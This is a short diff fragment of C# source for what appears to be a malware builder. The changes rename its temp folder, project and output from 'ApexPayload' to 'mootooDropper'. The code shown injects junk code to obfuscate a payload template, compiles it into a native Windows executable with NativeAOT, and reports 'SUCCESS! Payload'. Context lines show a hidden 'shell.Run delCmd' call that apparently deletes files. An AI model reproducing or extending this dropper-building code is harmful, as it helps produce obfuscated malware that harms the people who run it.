@@ -150,7 +150,7 @@ shell.Run delCmd, 0, False";
                 }
                 code = code.Replace("[[JUNK_CODE]]", junk.ToString());
 
-                string tDir = Path.Combine(Path.GetTempPath(), "ApexNativeTemp");
+                string tDir = Path.Combine(Path.GetTempPath(), "mootooDropperTemp");
                 if (Directory.Exists(tDir)) Directory.Delete(tDir, true);
                 Directory.CreateDirectory(tDir);
                 
@@ -176,7 +176,7 @@ shell.Run delCmd, 0, False";
   </PropertyGroup>
 </Project>", iconNode);
                 
-                string tempCsproj = Path.Combine(tDir, "ApexPayload.csproj");
+                string tempCsproj = Path.Combine(tDir, "mootooDropper.csproj");
                 File.WriteAllText(tempCsproj, csprojContent);
 
                 form.Log("Invoking NativeAOT Compiler (dotnet publish)...");
@@ -188,7 +188,7 @@ shell.Run delCmd, 0, False";
                     string output = p.StandardOutput.ReadToEnd();
                     p.WaitForExit();
                     if (p.ExitCode == 0) {
-                        string builtExe = Path.Combine(tDir, @"bin\Release\net10.0-windows\win-x64\publish\ApexPayload.exe");
+                        string builtExe = Path.Combine(tDir, @"bin\Release\net10.0-windows\win-x64\publish\mootooDropper.exe");
                         if(File.Exists(builtExe)) {
                             File.Copy(builtExe, outputPath, true);
                             form.Log("SUCCESS! Payload: " + outputPath);
